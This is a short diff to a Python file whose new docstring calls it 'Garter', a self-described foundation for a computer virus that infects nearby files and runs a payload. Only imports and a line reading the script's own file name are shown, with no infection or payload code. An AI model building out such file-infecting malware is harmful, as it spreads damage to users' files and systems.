@@ -1,4 +1,10 @@
-# ============================================================================
+'''
+==============================================================================
+"Garter" - By Zgell
+A simple and harmless foundation for a Python-based computer virus capable of
+infecting nearby files and executing a specific payload.
+==============================================================================
+'''
 import os, glob
 
 selfname = os.path.basename(__file__)
